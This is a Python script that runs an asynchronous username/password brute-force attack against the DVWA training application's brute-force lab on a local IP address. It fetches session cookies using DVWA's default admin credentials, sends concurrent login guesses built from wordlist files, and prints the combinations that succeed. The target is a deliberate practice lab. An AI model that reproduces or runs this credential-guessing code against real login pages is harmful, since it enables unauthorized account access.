# asynchronous requests
import asyncio
# multiple arguments to asyncio
import functools
# requests to get new PHPSESSID
import requests
# exit program when combination found
# DOES NOT WORK
from sys import exit
# measure how long it takes to complete the program
from time import time

users       = []
passwords   = []

with open('usernames.txt', 'r') as users_file:
    users = users_file.read().splitlines()

with open('passwords.txt', 'r') as passwords_file:
    passwords = passwords_file.read().splitlines()

url_cookies = {}

count = 0

for user in users:
    for password in passwords:
        url = ''
        url += 'http://192.168.1.167/dvwa/vulnerabilities/brute/'
        url += '?username=' + user
        url += '&password=' + password
        url += '&Login=Login'
        url_cookies[url] = {}

futures     = []
responses   = []

starting_time   = 0

def get_dvwa_cookies():
    dvwa_login = {'username': 'admin', 'password': 'password', 'Login':'Login'}
    for url in url_cookies.keys():
        with requests.Session() as session:
       	    with session.post('http://192.168.1.167/dvwa/login.php', data=dvwa_login) as req:
                url_cookies[url] = session.cookies.get_dict()

async def main():
    global loop, count

    for url in url_cookies.keys():
        futures.append(loop.run_in_executor(None, functools.partial(requests.get, url, cookies=url_cookies[url])))

    for future in futures:
        response    = await future
        #responses.append(await future)
        count       += 1
        if (b'incorrect' not in response.content):
            print(count)
            print(response.url)
            print(response.url.split('username=')[1].split('&')[0], response.url.split('password=')[1].split('&')[0]) 
            print(time() - starting_time)
            # non funziona perché ci sono ancora processi in esecuzione
            #quit()

if (__name__ == '__main__'):
    get_dvwa_cookies()
    starting_time = time()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    print(time() - starting_time)
    #print([page.url for page in responses])
